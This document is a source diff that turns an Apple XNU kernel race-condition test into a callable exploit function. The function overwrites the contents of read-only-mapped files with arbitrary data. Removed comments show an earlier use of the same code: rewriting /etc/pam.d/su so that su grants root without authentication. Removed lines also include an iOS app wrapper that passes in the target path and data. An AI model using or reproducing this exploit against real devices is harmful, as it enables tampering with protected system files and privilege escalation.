@@ -1,15 +1,6 @@
 // from https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c
 // modified to compile outside of XNU
 
-// clang -o switcharoo vm_unaligned_copy_switch_race.c
-// sed -e "s/rootok/permit/g" /etc/pam.d/su > overwrite_file.bin
-// ./switcharoo /etc/pam.d/su overwrite_file.bin
-// su
-// modified by haxi0
-
-@import Foundation;
-#import <UIKit/UIKit.h>
-#import "DockHider-Swift.h"
 #include <pthread.h>
 #include <dispatch/dispatch.h>
 #include <stdio.h>
@@ -21,21 +12,20 @@
 #include <fcntl.h>
 #include <sys/mman.h>
 
+#include "vm_unaligned_copy_switch_race.h"
+
 #define T_QUIET
 #define T_EXPECT_MACH_SUCCESS(a, b)
 #define T_EXPECT_MACH_ERROR(a, b, c)
 #define T_ASSERT_MACH_SUCCESS(a, b, ...)
 #define T_ASSERT_MACH_ERROR(a, b, c)
 #define T_ASSERT_POSIX_SUCCESS(a, b)
-#define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { fprintf(stderr, c "\n");} }while(0)
-#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { fprintf(stderr, c "\n");} }while(0)
+#define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { fprintf(stderr, c "\n"); exit(1); }}while(0)
+#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { fprintf(stderr, c "\n"); exit(1); }}while(0)
 #define T_ASSERT_TRUE(a, b, ...)
 #define T_LOG(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)
 #define T_DECL(a, b) static void a(void)
 #define T_PASS(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)
-
-static const char* g_arg_target_file_path;
-static const char* g_arg_overwrite_file_path;
 
 struct context1 {
     vm_size_t obj_size;
@@ -44,7 +34,7 @@ struct context1 {
     mach_port_t mem_entry_rw;
     dispatch_semaphore_t running_sem;
     pthread_mutex_t mtx;
-    bool done;
+    volatile bool done;
 };
 
 static void *
@@ -59,6 +49,9 @@ switcheroo_thread(__unused void *arg)
     while (!ctx->done) {
         /* wait for main thread to be done setting things up */
         pthread_mutex_lock(&ctx->mtx);
+        if (ctx->done) {
+            break;
+        }
         /* switch e0 to RW mapping */
         kr = vm_map(mach_task_self(),
             &ctx->e0,
@@ -94,14 +87,15 @@ switcheroo_thread(__unused void *arg)
     return NULL;
 }
 
-T_DECL(unaligned_copy_switch_race,
-    "Test that unaligned copy respects read-only mapping")
-{
+bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const void* overwrite_data, size_t overwrite_length) {
+    bool retval = false;
     pthread_t th = NULL;
     int ret;
     kern_return_t kr;
     time_t start, duration;
+#if 0
     mach_msg_type_number_t cow_read_size;
+#endif
     vm_size_t copied_size;
     int loops;
     vm_address_t e2, e5;
@@ -112,6 +106,19 @@ T_DECL(unaligned_copy_switch_race,
 
     ctx = &context1;
     ctx->obj_size = 256 * 1024;
+
+    void* file_mapped = mmap(NULL, ctx->obj_size, PROT_READ, MAP_SHARED, file_to_overwrite, file_offset);
+    if (file_mapped == MAP_FAILED) {
+        fprintf(stderr, "failed to map\n");
+        return false;
+    }
+    if (!memcmp(file_mapped, overwrite_data, overwrite_length)) {
+        fprintf(stderr, "already the same?\n");
+        munmap(file_mapped, ctx->obj_size);
+        return true;
+    }
+    ro_addr = file_mapped;
+
     ctx->e0 = 0;
     ctx->running_sem = dispatch_semaphore_create(0);
     T_QUIET; T_ASSERT_NE(ctx->running_sem, NULL, "dispatch_semaphore_create");
@@ -130,8 +137,7 @@ T_DECL(unaligned_copy_switch_race,
     /* initialize to 'A' */
     memset((char *)ro_addr, 'A', ctx->obj_size);
 #endif
-    int fd = open(g_arg_target_file_path, O_RDONLY | O_CLOEXEC);
-    ro_addr = (uintptr_t)mmap(NULL, ctx->obj_size, PROT_READ, MAP_SHARED, fd, 0);
+
     /* make it read-only */
     kr = vm_protect(mach_task_self(),
         ro_addr,
@@ -195,27 +201,8 @@ T_DECL(unaligned_copy_switch_race,
     /* initialize to 'C' */
     memset((char *)e5, 'C', ctx->obj_size);
 
-    FILE* overwrite_file = fopen(g_arg_overwrite_file_path, "r");
-    fseek(overwrite_file, 0, SEEK_END);
-    size_t overwrite_length = ftell(overwrite_file);
-    if (overwrite_length >= PAGE_SIZE) {
-        fprintf(stderr, "too long!\n");
-        fprintf(stderr, "overwrite_length: %zu\n", overwrite_length);
-        fprintf(stderr, "PAGE_SIZE: %d\n", PAGE_SIZE);
-        // shrink it until it fits
-        while (overwrite_length >= PAGE_SIZE) {
-            overwrite_length -= 1;
-        }
-        fprintf(stderr, "shrunk to: %zu\n", overwrite_length);
-        // set the file pointer back to the beginning
-        fseek(overwrite_file, 0, SEEK_SET);
-        // truncate the file
-        ftruncate(fileno(overwrite_file), overwrite_length);
-    }
-    fseek(overwrite_file, 0, SEEK_SET);
     char* e5_overwrite_ptr = (char*)(e5 + ctx->obj_size - overwrite_length);
-    fread(e5_overwrite_ptr, 1, overwrite_length, overwrite_file);
-    fclose(overwrite_file);
+    memcpy(e5_overwrite_ptr, overwrite_data, overwrite_length);
 
     int overwrite_first_diff_offset = -1;
     char overwrite_first_diff_value = 0;
@@ -227,9 +214,7 @@ T_DECL(unaligned_copy_switch_race,
     }
     if (overwrite_first_diff_offset == -1) {
         fprintf(stderr, "no diff?\n");
-        InProg *inProg = [[InProg alloc] init];
-        [inProg disableProg];
-        return;
+        return false;
     }
 
     /*
@@ -334,7 +319,10 @@ T_DECL(unaligned_copy_switch_race,
             break;
         }
         /* check that our read-only memory was not modified */
+#if 0
         T_QUIET; T_ASSERT_EQ(((char *)ro_addr)[overwrite_first_diff_offset], overwrite_first_diff_value, "RO mapping was modified");
+#endif
+        bool is_still_equal = ((char *)ro_addr)[overwrite_first_diff_offset] == overwrite_first_diff_value;
 
         /* tell racing thread to stop toggling mappings */
         pthread_mutex_lock(&ctx->mtx);
@@ -344,9 +332,15 @@ T_DECL(unaligned_copy_switch_race,
         ctx->e0 = 0;
         vm_deallocate(mach_task_self(), e2, ctx->obj_size);
         e2 = 0;
+        if (!is_still_equal) {
+            retval = true;
+            fprintf(stderr, "RO mapping was modified\n");
+            break;
+        }
     }
 
     ctx->done = true;
+    pthread_mutex_unlock(&ctx->mtx);
     pthread_join(th, NULL);
 
     kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_rw);
@@ -358,21 +352,10 @@ T_DECL(unaligned_copy_switch_race,
     kr = vm_deallocate(mach_task_self(), e5, ctx->obj_size);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(e5)");
 
-
+#if 0
     T_LOG("vm_read_overwrite: KERN_SUCCESS:%d KERN_PROTECTION_FAILURE:%d other:%d",
         kern_success, kern_protection_failure, kern_other);
     T_PASS("Ran %d times in %ld seconds with no failure", loops, duration);
-    InProg *inProg = [[InProg alloc] init];
-    [inProg disableProg];
-}
-
-void overwriteFile(NSData *data, NSString *path) {
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-        g_arg_target_file_path = [path UTF8String];
-        // save the data to a temp file
-        NSString *model_path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"pwned"];
-        [data writeToFile:model_path atomically:YES];
-        g_arg_overwrite_file_path = [model_path UTF8String];
-        unaligned_copy_switch_race();
-    });
+#endif
+    return retval;
 }
